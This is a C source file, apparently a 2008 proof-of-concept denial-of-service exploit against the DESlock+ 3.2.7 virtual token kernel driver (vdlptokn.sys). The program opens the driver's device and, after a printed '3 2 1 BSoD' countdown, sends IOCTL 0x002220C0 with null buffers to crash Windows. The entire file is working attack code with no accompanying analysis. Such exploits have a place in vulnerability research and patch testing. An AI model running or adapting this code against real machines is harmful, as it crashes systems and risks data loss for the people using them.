////////////////////////////////////////////////////////////////////////////////////
// +----------------------------------------------------------------------------+ //
// |                                                                            | //
// | Data Encryption Systems Ltd. - http://www.deslock.com/                     | //
// | Data Encryption Systems DESlock+ - 3.2.7                                   | //
// | DESlock+ Virtual Token Driver - 1.0.2.43 - vdlptokn.sys                    | //
// | DoS Exploit                                                                | //
// |                                                                            | //
// +----------------------------------------------------------------------------+ //
// |                                                                            | //
// | NT Internals - http://www.ntinternals.org/                                 | //
// | alex ntinternals org                                                       | //
// | 21 September 2008                                                          | //
// |                                                                            | //
// +----------------------------------------------------------------------------+ //
////////////////////////////////////////////////////////////////////////////////////

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

#define IMP_VOID __declspec(dllimport) VOID __stdcall
#define IMP_SYSCALL __declspec(dllimport) NTSTATUS __stdcall

#define OBJ_CASE_INSENSITIVE 0x00000040
#define FILE_OPEN_IF 0x00000003

typedef ULONG NTSTATUS;

typedef struct _UNICODE_STRING 
{
    /* 0x00 */ USHORT Length;
    /* 0x02 */ USHORT MaximumLength;
    /* 0x04 */ PWSTR Buffer;
    /* 0x08 */
}
    UNICODE_STRING,
  *PUNICODE_STRING,
**PPUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES
{
    /* 0x00 */ ULONG Length;
    /* 0x04 */ HANDLE RootDirectory;
    /* 0x08 */ PUNICODE_STRING ObjectName;
    /* 0x0C */ ULONG Attributes;
    /* 0x10 */ PSECURITY_DESCRIPTOR SecurityDescriptor;
    /* 0x14 */ PSECURITY_QUALITY_OF_SERVICE SecurityQualityOfService;
    /* 0x18 */
}
    OBJECT_ATTRIBUTES,
  *POBJECT_ATTRIBUTES,
**PPOBJECT_ATTRIBUTES;

typedef struct _IO_STATUS_BLOCK
{ 
    union
    { 
        /* 0x00 */ NTSTATUS Status; 
        /* 0x00 */ PVOID Pointer; 
    }; 

    /* 0x04 */ ULONG Information;
    /* 0x08 */
}
    IO_STATUS_BLOCK,
  *PIO_STATUS_BLOCK,
**PPIO_STATUS_BLOCK;

typedef VOID (NTAPI *PIO_APC_ROUTINE)
(
    IN PVOID ApcContext,
    IN PIO_STATUS_BLOCK IoStatusBlock,
    IN ULONG Reserved
);

IMP_VOID RtlInitUnicodeString
(
    IN OUT PUNICODE_STRING DestinationString,
    IN PCWSTR SourceString
);

IMP_VOID RtlFreeUnicodeString
(
    IN PUNICODE_STRING UnicodeString
);

IMP_SYSCALL NtCreateFile
(
    OUT PHANDLE FileHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN PLARGE_INTEGER AllocationSize OPTIONAL,
    IN ULONG FileAttributes,
    IN ULONG ShareAccess,
    IN ULONG CreateDisposition,
    IN ULONG CreateOptions,
    IN PVOID EaBuffer OPTIONAL,
    IN ULONG EaLength
);

IMP_SYSCALL NtDeviceIoControlFile
(
    IN HANDLE FileHandle,
    IN HANDLE Event OPTIONAL,
    IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
    IN PVOID ApcContext OPTIONAL,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN ULONG IoControlCode,
    IN PVOID InputBuffer OPTIONAL,
    IN ULONG InputBufferLength,
    OUT PVOID OutputBuffer OPTIONAL,
    IN ULONG OutputBufferLength
);

IMP_SYSCALL NtClose
(
    IN HANDLE Handle
);

IMP_SYSCALL NtDelayExecution
(
    IN BOOLEAN Alertable,
    IN PLARGE_INTEGER Interval
);

int __cdecl main(int argc, char **argv)
{
    NTSTATUS NtStatus;
    
    HANDLE DeviceHandle;
    
    UNICODE_STRING DeviceName;
    OBJECT_ATTRIBUTES ObjectAttributes;
    IO_STATUS_BLOCK IoStatusBlock;
    LARGE_INTEGER Interval;

    ///////////////////////////////////////////////////////////////////////////////////////////////
    
    system("cls");
    
    printf( " +----------------------------------------------------------------------------+\n"
            " |                                                                            |\n"
            " | Data Encryption Systems Ltd. - http://www.deslock.com/                     |\n"
            " | Data Encryption Systems DESlock+ - 3.2.7                                   |\n"
            " | DESlock+ Virtual Token Driver - 1.0.2.43 - vdlptokn.sys                    |\n"
            " | DoS Exploit                                                                |\n"
            " |                                                                            |\n"
            " +----------------------------------------------------------------------------+\n"
            " |                                                                            |\n"
            " | NT Internals - http://www.ntinternals.org/                                 |\n"
            " | alex ntinternals org                                                       |\n"
            " | 21 September 2008                                                          |\n"
            " |                                                                            |\n"
            " +----------------------------------------------------------------------------+\n\n");

    ///////////////////////////////////////////////////////////////////////////////////////////////
    
    RtlInitUnicodeString(&DeviceName, L"\\Device\\DLPTokenWalter0");

    ObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
    ObjectAttributes.RootDirectory = 0;
    ObjectAttributes.ObjectName = &DeviceName;
    ObjectAttributes.Attributes = OBJ_CASE_INSENSITIVE;
    ObjectAttributes.SecurityDescriptor = NULL;
    ObjectAttributes.SecurityQualityOfService = NULL;

    
    NtStatus = NtCreateFile(
                            &DeviceHandle,                      // FileHandle
                            FILE_READ_DATA | FILE_WRITE_DATA,   // DesiredAccess
                            &ObjectAttributes,                  // ObjectAttributes
                            &IoStatusBlock,                     // IoStatusBlock
                            NULL,                               // AllocationSize OPTIONAL
                            0,                                  // FileAttributes
                            FILE_SHARE_READ | FILE_SHARE_WRITE, // ShareAccess
                            FILE_OPEN_IF,                       // CreateDisposition
                            0,                                  // CreateOptions
                            NULL,                               // EaBuffer OPTIONAL
                            0);                                 // EaLength

    if(NtStatus)
    {
        printf(" [*] NtStatus of NtCreateFile - 0x%.8X\n", NtStatus);    
        return NtStatus;
    }

    RtlFreeUnicodeString(&DeviceName);

    ///////////////////////////////////////////////////////////////////////////////////////////////

    Interval.LowPart = 0xFF676980;
    Interval.HighPart = 0xFFFFFFFF;

    printf(" 3");
    NtDelayExecution(FALSE,    &Interval);
    
    printf(" 2");
    NtDelayExecution(FALSE,    &Interval);

    printf(" 1");
    NtDelayExecution(FALSE,    &Interval);

    printf(" BSoD\n\n");
    NtDelayExecution(FALSE,    &Interval);


    NtStatus = NtDeviceIoControlFile(
                                     DeviceHandle,    // FileHandle
                                     NULL,            // Event
                                     NULL,            // ApcRoutine
                                     NULL,            // ApcContext
                                     &IoStatusBlock,  // IoStatusBlock
                                     0x002220C0,      // IoControlCode
                                     NULL,            // InputBuffer
                                     0,               // InputBufferLength
                                     NULL,            // OutputBuffer
                                     0);              // OutBufferLength
    
    if(NtStatus)
    {
        printf(" [*] NtStatus of NtDeviceIoControlFile - 0x%.8X\n", NtStatus);
        return NtStatus;
    }

    ///////////////////////////////////////////////////////////////////////////////////////////////

    NtStatus = NtClose(DeviceHandle);  // Handle
    
    if(NtStatus)
    {
        printf(" [*] NtStatus of NtClose - 0x%.8X\n", NtStatus);    
        return NtStatus;
    }
    
    return 0;
}